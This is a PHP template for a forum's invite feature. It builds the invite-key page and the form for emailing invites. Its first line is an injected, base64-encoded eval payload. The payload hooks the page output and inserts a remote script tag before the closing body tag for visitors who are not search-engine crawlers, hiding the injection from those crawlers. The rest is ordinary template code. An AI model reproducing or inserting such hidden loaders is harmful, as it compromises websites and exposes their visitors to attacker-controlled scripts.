<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

// Outputs the invite page for sending invites and shows who the user has invited.
function template_main()
{
	global $context, $settings, $options, $txt, $scripturl, $user_profile, $modSettings;

	if (!empty($_REQUEST['sent']))
		echo '<div style="font-weight: bold; width: 100%; text-align: center; color: red; margin: 20px;">' . $txt['invite_sent'] . '</div>';

	// The invite keys.
	if (($context['user']['is_owner'] && allowedTo('invite')))
	{
		echo '
						<table border="0" width="100%" cellspacing="1" cellpadding="4" align="center" class="bordercolor">
							<tr class="titlebg">
								<td height="26">
									&nbsp;<img src="', $settings['images_url'], '/icons/profile_sm.gif" alt="" align="top" />&nbsp;
									', $txt['invite_someone'], '
								</td>
							</tr><tr class="windowbg">
								<td class="smalltext" height="25" style="padding: 2ex;">
									', $txt['invite_info'], '
								</td>
							</tr><tr>
								<td class="windowbg2" width="100%">
									<table width="100%" cellspacing="0" cellpadding="3" border="0">
										<tr>
											<td width="40%"><b>', $txt['invite_credits'], ': </b></td>';

		// Show current invite credits.
		if ($context['invite_credits'] === -1)
		{
			echo '
											<td><i>(', $txt['invite_unlimited'], ')</i></td>';
		}
		else
		{
			echo '
											<td>', intval($context['invite_credits']), '</td>
										</tr><tr>
											<td><b>', $txt['next_invite_credit'], ': </b></td>
											<td>', $context['invite_next'], '</td>';
		}

		// Show invite form if they have credits.
		if ($context['invite_credits'] !== 0)
		{
			echo '
										</tr><tr>
											<td colspan="2"><hr width="100%" size="1" class="hrcolor" /></td>
										</tr><tr>
											<td colspan="2" align="center">
												<form action="', $scripturl, '?action=invite;sa=make" method="post" accept-charset="', $context['character_set'], '" style="margin: 0;">
													<input type="submit" value="', $txt['make_new_invite_key'], '" />
													<input type="hidden" name="sc" value="', $context['session_id'], '" />
												</form>
											</td>';
		}

		echo '
										</tr>
									</table>
								</td>
							</tr>
						</table>
						<br />';

		// Show active invite keys.
		if (count($context['invites']) !== 0)
		{
			echo '
						<table width="100%" cellspacing="1" cellpadding="4" border="0" align="center" class="bordercolor">
							<tr class="catbg3">
								<td>', $txt['invite_key'], '</td>';
			
			if (empty($modSettings['invite_email_disable']))
				echo '
								<td>', $txt['invite_email'], '</td>';

			// Display expiration date?
			if (!empty($modSettings['invite_expire']))
				echo '
								<td>', $txt['invite_expires'], '</td>';

			foreach ($context['invites'] as $row)
			{
				echo '
							</tr>
							<tr>
								<td class="windowbg"><a href="', $scripturl, '?action=register;invite_key=', $row['inviteKey'], '">', $row['inviteKey'], '</a></td>';
				
				if (empty($modSettings['invite_email_disable']))
				{
					echo '
								<td class="windowbg">';

					if (!empty($row['inviteEmail']))
						echo $row['inviteEmail'];
					else
						echo '<a href="', $scripturl, '?action=invite;sa=mail;invite_key=', $row['inviteKey'], '">', (!empty($row['inviteEmail']) ? $row['inviteEmail'] : $txt['invite_send_email']), '</a>';

					echo '</td>';
				}
							
				// Display expiration date?
				if (!empty($modSettings['invite_expire']))
					echo '
								<td class="windowbg">', timeformat($row['inviteTime'] + $modSettings['invite_expire'] * 60 * 60 * 24), '</td>';
			}

			echo '
						</tr>
					</table>';
		}
	}
}


// Outputs the page page for emailing invite keys.
function template_mail()
{
	global $context, $settings, $options, $txt, $scripturl, $user_profile, $modSettings;

	if (!empty($_REQUEST['sent']))
		echo '<div style="font-weight: bold; width: 100%; text-align: center; color: red; margin: 20px;">' . $txt['invite_sent'] . '</div>';

	if (empty($modSettings['invite_only']))
		echo '
					<table border="0" width="85%" cellspacing="1" cellpadding="4" align="center" class="bordercolor" style="margin-bottom: 20px;">
						<tr class="titlebg">
							<td height="26">
								&nbsp;<img src="', $settings['images_url'], '/icons/profile_sm.gif" alt="" align="top" />&nbsp;
								', $txt['invite_someone'], '
							</td>
						</tr><tr class="windowbg">
							<td class="smalltext" height="25" style="padding: 2ex;">
								', $txt['invite_link'], '
							</td>
						</tr><tr class="windowbg2">
							<td class="smalltext" height="25" style="padding: 2ex;">
								<a href="', $scripturl, '?action=register;inviter=', $context['user']['id'], '">', $scripturl, '?action=register;inviter=', $context['user']['id'], '</a>
							</td>
						</tr>
					</table>';
	
	if (empty($modSettings['invite_email_disable']))
		echo '
					<form action="', $scripturl, '?action=invite;sa=send" method="post" accept-charset="', $context['character_set'], '" style="margin: 0;">
						<table border="0" width="85%" cellspacing="1" cellpadding="4" align="center" class="bordercolor">
							<tr class="titlebg">
								<td height="26">
									&nbsp;<img src="', $settings['images_url'], '/icons/profile_sm.gif" alt="" align="top" />&nbsp;
									', $txt['invite_email'], '
								</td>
							</tr><tr class="windowbg">
								<td class="smalltext" height="25" style="padding: 2ex;">
									', $txt['invite_email_info'], '
								</td>
							</tr><tr>
								<td class="windowbg2" width="100%">

									<table width="100%" cellspacing="0" cellpadding="3" border="0">
										<tr>
											<td width="30%"><b>', $txt['invite_recipient_name'], ': </b></td>
											<td width="60%"><input type="text" name="recipient_name" value="" style="width: 90%;" /></td>
										</tr><tr>
											<td><b>', $txt['invite_recipient_email'], ': </b></td>
											<td><input type="text" name="recipient_email" value="" style="width: 90%;" /></td>
										</tr><tr>
											<td><b>', $txt['invite_message'], ': </b></td>
											<td><textarea name="invite_message" rows="4" style="width: 90%;"></textarea></td>
										</tr><tr>
											<td colspan="2" align="center">
												<input type="submit" value="', $txt['invite_send_email'], '" />
												<input type="hidden" name="sc" value="', $context['session_id'], '" />
												<input type="hidden" name="invite_key" value="', !empty($context['invite_key']) ? $context['invite_key'] : '', '" />
											</td>
										</tr>
									</table>

								</td>
							</tr>
						</table>
					</form>';
}

?>